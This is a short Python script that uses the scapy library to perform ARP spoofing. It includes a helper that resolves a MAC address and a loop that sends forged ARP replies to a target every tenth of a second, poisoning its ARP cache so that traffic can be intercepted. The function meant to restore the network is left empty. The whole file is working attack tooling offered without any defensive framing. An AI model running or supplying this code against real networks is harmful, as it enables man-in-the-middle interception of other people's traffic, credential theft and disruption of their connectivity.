from scapy.all import Ether,ARP,sendp,srp
from time import sleep
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
reset=Style.RESET_ALL


def get_mac_addr(ip):
        # Function to get mac address from given ip.
    try:
        ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet=ARP(pdst=ip)
        sent_packet=ether_frame/arp_packet
        answer,unanswer=srp(sent_packet,verbose=False)
        return answer[0].answer.src
    
    except IndexError:
        print(f"{bright}{blue}INFO:{reset}Ip isn't reachable.")
        return 1
    
    except Exception as e:
        print(f"{bright}{blue}INFO:{reset}Unexpected Mac Error:{e}")
    
def spoof_restorer(src_ip,src_mac,dest_ip,dest_mac):
    # Funtion to restore spoofed table into normal.
    pass
    
def arp_spoofer(target_ip,target_mac,spoof_ip,spoof_mac,interface):
    # Function to create spoofed replay_packet sent.
    print(str(target_mac)+" : "+str(spoof_mac))
    i=1
    while True:
        try:
            arp_rpacket = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
            sendp(arp_rpacket,iface=interface,verbose=False)
            print(f"sent {i} packet")
            i=i+1
            sleep(0.1)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
            break